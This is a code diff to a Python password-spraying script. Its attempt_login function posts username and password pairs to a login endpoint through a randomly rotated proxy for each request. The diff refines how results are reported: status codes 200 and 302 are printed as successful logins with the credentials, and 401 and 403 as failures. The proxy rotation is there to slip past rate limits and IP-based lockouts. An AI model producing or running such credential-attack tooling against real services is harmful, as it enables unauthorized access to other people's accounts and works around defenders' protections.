@@ -43,19 +43,25 @@ def attempt_login(username, password):
         'password': password
     }
     
-    # Get a random proxy for the request
+    # Get a random proxy for each request
     proxy = get_random_proxy()
     
     try:
         response = requests.post(url, json=data, proxies=proxy)
-        
-        # Check the response status
+
+        # Check the HTTP status code
         if response.status_code == 200:
-            print(f"Successful login with {username}:{password} using proxy {proxy}")
+            print(f"[+] Successful login with {username}:{password} (Status Code: {response.status_code}) using proxy {proxy}")
+        elif response.status_code == 302:  # Redirect (could indicate success in some systems)
+            print(f"[+] Successful login with {username}:{password} (Redirect to: {response.headers.get('Location', 'unknown')}) using proxy {proxy}")
+        elif response.status_code == 401:
+            print(f"[-] Failed login for {username} (Status Code: 401 Unauthorized) using proxy {proxy}")
+        elif response.status_code == 403:
+            print(f"[-] Failed login for {username} (Status Code: 403 Forbidden) using proxy {proxy}")
         else:
-            print(f"Failed login for {username} using proxy {proxy}")
+            print(f"[-] Failed login for {username} (Status Code: {response.status_code}) using proxy {proxy}")
     except Exception as e:
-        print(f"Error with proxy {proxy}: {e}")
+        print(f"[-] Error occurred for {username}: {e} using proxy {proxy}")
 
 # Function to perform password spraying
 def password_spray(usernames, passwords):
